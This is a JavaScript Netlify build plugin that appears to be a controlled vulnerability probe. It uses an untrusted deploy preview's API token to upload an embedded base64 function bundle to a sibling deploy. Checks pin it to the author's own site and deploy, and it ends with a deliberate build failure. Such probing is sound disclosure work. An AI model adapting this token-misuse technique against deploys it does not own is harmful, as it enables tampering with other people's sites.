import { createHash } from 'node:crypto'

const EXPECTED_SITE_ID = '43a2f4e4-df31-455e-85bc-21f37fae92cd'
const EXPECTED_BRANCH = 'bot/untrusted-preview-probe-36495196637'
const EXPECTED_API_ORIGIN = 'https://api.netlify.com'
const TARGET_DEPLOY_ID = '6abdca497c8ea035290f16b2'
const TARGET_BRANCH = 'fn-bind-target-20260930'
const FUNCTION_NAME = 'sibling-binding-canary'
const BUNDLE_SHA256 = '31568bdc5198f15672fd746cb71b4bdb21f36db0cdb30d768cf8033dff0cd3aa'
const BUNDLE_BASE64 =
  'UEsDBBQACAAIAAAAIQAAAAAAAAAAAAAAAAAZAAAAc2libGluZy1iaW5kaW5nLWNhbmFyeS5qcxXFyw2AIAwA0FW4oQfLBA7Dp5gaLNqWRLY3vsu7ehkNAd+7i6nbneAzSHDxEBitUZ2hDs5GnTUopUZ8bIm4/OfIUSac6tcPUEsHCKZ6/BtHAAAASQAAAFBLAwQUAAgACAAAACEAAAAAAAAAAAAAAAAAKwAAAG5ldGxpZnkvZnVuY3Rpb25zL3NpYmxpbmctYmluZGluZy1jYW5hcnkuanOFVMFu2zAMvecrWB8KG4iTrAMGLEUGDF0vBZoM6LEoBEVmGne2ZEhyFiPNv4+U7Thd0e1o8pF+75HUTloQIsPNT2sqWMBq/YLKTyiQa+QYWt9cj3YB9ox+9Vtz9Ac6NaCHOKM5Z/PKG/u+bilLdB8VhmRfs5Wu+9cAr6zxxjcVTobsOT/cV8Z6wsdeWiI1BlkUCSy+wWEEsDEWYhaiiQTkOiQpDoMBpzqGjOEA1GTOuEcOPI0BdV2ilesC5+BtjXBMrkfHnrMyVcPusMLYmzFsrCmpaK+wIjIZGXNik28g5jRcXgJLMpuAhsViAZEJU4jg9fV9blNr5XOjoySo6nQV6OEXNkBthBjmESwN/0mSIBWAf3whxODgRJHAQJcaJMyHG10Qj5Z4X/jGJxJHqJNFcdDFeh4p/JdRFzErJ0/OmfGWBGKhUZKwVoZNBouDuQBHIm7R11aDN2due3NjytLouwe2uzRZ4CDEaQrxabHjw3EMkRDo7k1WFxgx8Z0s6mGMY+AO16PRdEq/MYWbavRFvmnS3vB0ness188preEa+/S0T7upy9cF53ucklraZlK+uHA/XVp0adGmRbu0vDIHWiTiGJY4/jea+JMrW6mzAu0cWvu7zxHvJIkhnZOhuRCDX/9pTuV8JsvV8uaWaEW9Eb2+XvFJ6NXs6svs6+dZuvsUtbUdFaqWrtGqIxgzaeelr92Nycj7q9lszDpQZmjdvFvoSEm1xVQZ7a0pojkxMKmj94TmRmiAiFOofcqHw3lZVUWuJJ/F9MXRbXS4fdpz75oVmLXjo6qgj/odGbw2WTOHu4fVcuK8pSnS5ANdIkxkSsksuoX40Adba5+XmBorFZlPbrQ8tNGK1IYftpHewts9qtpj1r4mbY4M81v0uVrpgjjxM8MskzBX2s7vWhvyEIFQcDqB7u3jd8qFp+724R7yMjyI9NZp9ns04+vmU3m7G2e7FH7yB1BLBwga2G9h2AIAABUGAABQSwECLQMUAAgACAAAACEApnr8G0cAAABJAAAAGQAAAAAAAAAAACAApIEAAAAAc2libGluZy1iaW5kaW5nLWNhbmFyeS5qc1BLAQItAxQACAAIAAAAIQAa2G9h2AIAABUGAAArAAAAAAAAAAAAIACkgY4AAABuZXRsaWZ5L2Z1bmN0aW9ucy9zaWJsaW5nLWJpbmRpbmctY2FuYXJ5LmpzUEsFBgAAAAACAAIAoAAAAL8DAAAAAA=='
const BUNDLE = Buffer.from(BUNDLE_BASE64, 'base64')

const normalizeApiBase = (value) =>
  /^https?:\/\//i.test(value || '') ? value : `https://${value || 'api.netlify.com'}`

const readSitePolicy = async ({ apiBase, token }) => {
  try {
    const response = await fetch(new URL(`/api/v1/sites/${EXPECTED_SITE_ID}`, apiBase), {
      headers: { authorization: `Bearer ${token}` },
      redirect: 'error',
      signal: AbortSignal.timeout(10_000),
    })
    const body = response.ok ? await response.json() : null
    return {
      status: response.status,
      untrustedFlow: body?.build_settings?.untrusted_flow || null,
      publicRepo: body?.build_settings?.public_repo === true,
      responseBodyRetained: false,
    }
  } catch (error) {
    return {
      requestFailed: true,
      errorClass: error?.constructor?.name || 'Error',
      responseBodyRetained: false,
    }
  }
}

const readDeploy = async ({ apiBase, deployId, token }) => {
  try {
    const response = await fetch(new URL(`/api/v1/deploys/${deployId}`, apiBase), {
      headers: { authorization: `Bearer ${token}` },
      redirect: 'error',
      signal: AbortSignal.timeout(10_000),
    })
    const body = response.ok ? await response.json() : null
    const requiredFunctions = Array.isArray(body?.required_functions)
      ? body.required_functions
      : null
    return {
      status: response.status,
      ok: response.ok,
      deployIdMatches: body?.id === deployId,
      siteIdMatches: body?.site_id === EXPECTED_SITE_ID,
      context: ['deploy-preview', 'branch-deploy', 'production'].includes(body?.context)
        ? body.context
        : null,
      branch: typeof body?.branch === 'string' ? body.branch : null,
      reviewId: body?.review_id == null ? null : String(body.review_id),
      commitRef: /^[0-9a-f]{40}$/.test(body?.commit_ref || '') ? body.commit_ref : null,
      state: [
        'new',
        'enqueued',
        'building',
        'uploading',
        'uploaded',
        'preparing',
        'prepared',
        'processing',
        'processed',
        'ready',
        'error',
      ].includes(body?.state)
        ? body.state
        : null,
      published: body?.published_at != null,
      requiredFunctionCount: requiredFunctions?.length ?? null,
      requiredFunctionMatches:
        requiredFunctions?.length === 1 && requiredFunctions[0] === BUNDLE_SHA256,
      responseBodyRetained: false,
    }
  } catch (error) {
    return {
      requestFailed: true,
      errorClass: error?.constructor?.name || 'Error',
      responseBodyRetained: false,
    }
  }
}

const uploadTargetFunction = async ({ apiBase, token }) => {
  try {
    const encodedName = encodeURIComponent(FUNCTION_NAME)
    const expectedPathname = `/api/v1/deploys/${TARGET_DEPLOY_ID}/functions/${encodedName}`
    const url = new URL(expectedPathname, apiBase)
    if (url.pathname !== expectedPathname || decodeURIComponent(encodedName) !== FUNCTION_NAME) {
      throw new Error('Target upload path did not round-trip')
    }
    url.searchParams.set('runtime', 'js')
    url.searchParams.set('size', String(BUNDLE.length))
    const response = await fetch(url, {
      method: 'PUT',
      headers: {
        authorization: `Bearer ${token}`,
        'content-type': 'application/octet-stream',
      },
      body: BUNDLE,
      redirect: 'error',
      signal: AbortSignal.timeout(20_000),
    })
    await response.body?.cancel()
    return {
      status: response.status,
      ok: response.ok,
      responseBodyRead: false,
    }
  } catch (error) {
    return {
      requestFailed: true,
      errorClass: error?.constructor?.name || 'Error',
      responseBodyRead: false,
    }
  }
}

export const onPostBuild = async ({ constants, utils }) => {
  const currentDeployId = process.env.DEPLOY_ID || ''
  const currentCommitRef = process.env.COMMIT_REF || ''
  const token = constants.NETLIFY_API_TOKEN
  const apiBase = normalizeApiBase(constants.NETLIFY_API_HOST)
  let apiEndpointTrusted = false
  try {
    const parsedApiBase = new URL(apiBase)
    apiEndpointTrusted =
      parsedApiBase.origin === EXPECTED_API_ORIGIN &&
      parsedApiBase.pathname === '/' &&
      parsedApiBase.search === '' &&
      parsedApiBase.hash === '' &&
      parsedApiBase.username === '' &&
      parsedApiBase.password === ''
  } catch {}

  const tokenPresent = typeof token === 'string' && token.length > 0
  const canRead = apiEndpointTrusted && tokenPresent
  const policy = canRead ? await readSitePolicy({ apiBase, token }) : null
  const currentDeploy =
    canRead && /^[0-9a-f]{24}$/.test(currentDeployId)
      ? await readDeploy({ apiBase, deployId: currentDeployId, token })
      : null
  const targetBefore = canRead
    ? await readDeploy({ apiBase, deployId: TARGET_DEPLOY_ID, token })
    : null
  const prerequisites = {
    deployPreview: process.env.CONTEXT === 'deploy-preview',
    controlledReview: process.env.REVIEW_ID === '1',
    controlledSite: constants.SITE_ID === EXPECTED_SITE_ID,
    buildbotMode: constants.IS_LOCAL === false,
    trustedApiEndpoint: apiEndpointTrusted,
    policyReadSucceeded: policy?.status === 200,
    redactedPolicy: policy?.untrustedFlow === 'redact',
    publicRepository: policy?.publicRepo === true,
    currentDeployIdPresent: /^[0-9a-f]{24}$/.test(currentDeployId),
    currentCommitRefPresent: /^[0-9a-f]{40}$/.test(currentCommitRef),
    currentDeployBindingExact:
      currentDeploy?.status === 200 &&
      currentDeploy?.deployIdMatches === true &&
      currentDeploy?.siteIdMatches === true &&
      currentDeploy?.context === 'deploy-preview' &&
      currentDeploy?.branch === EXPECTED_BRANCH &&
      currentDeploy?.reviewId === '1' &&
      currentDeploy?.commitRef === currentCommitRef &&
      currentDeploy?.state === 'building' &&
      currentDeploy?.published === false,
    targetDeployIdExact: TARGET_DEPLOY_ID === '6abdca497c8ea035290f16b2',
    targetDistinctFromCurrent: TARGET_DEPLOY_ID !== currentDeployId,
    targetDeployBindingExact:
      targetBefore?.status === 200 &&
      targetBefore?.deployIdMatches === true &&
      targetBefore?.siteIdMatches === true &&
      targetBefore?.context === 'deploy-preview' &&
      targetBefore?.branch === TARGET_BRANCH &&
      targetBefore?.reviewId === null &&
      targetBefore?.commitRef === null &&
      targetBefore?.state === 'uploading' &&
      targetBefore?.published === false &&
      targetBefore?.requiredFunctionCount === 1 &&
      targetBefore?.requiredFunctionMatches === true,
    tokenPresent,
    functionBundlePinned:
      BUNDLE.length === 1141 &&
      createHash('sha256').update(BUNDLE).digest('hex') === BUNDLE_SHA256,
  }
  const result = {
    schema: 'netlify-untrusted-same-site-cross-deploy-function-upload.v1',
    prerequisites,
    policy,
    currentDeploy,
    targetBefore,
    attempted: false,
    upload: null,
    targetAfter: null,
    controlledFailureRequested: false,
    targetSiteOwned: true,
    targetDeployCreatedForProbe: true,
    productionTargeted: false,
    credentialValuesLogged: false,
    digestValuesLogged: false,
    responseBodiesRetained: false,
    syntheticOnly: true,
  }

  if (!Object.values(prerequisites).every(Boolean)) {
    console.log(`NETLIFY_UNTRUSTED_SIBLING_FUNCTION_BINDING ${JSON.stringify(result)}`)
    utils.build.failBuild('Controlled sibling Function probe prerequisites were not satisfied')
    return
  }

  result.attempted = true
  result.upload = await uploadTargetFunction({ apiBase, token })
  await new Promise((resolveWait) => setTimeout(resolveWait, 1_000))
  result.targetAfter = await readDeploy({ apiBase, deployId: TARGET_DEPLOY_ID, token })
  result.controlledFailureRequested = true
  console.log(`NETLIFY_UNTRUSTED_SIBLING_FUNCTION_BINDING ${JSON.stringify(result)}`)
  utils.build.failBuild('Controlled failure after same-site sibling Function upload probe')
}
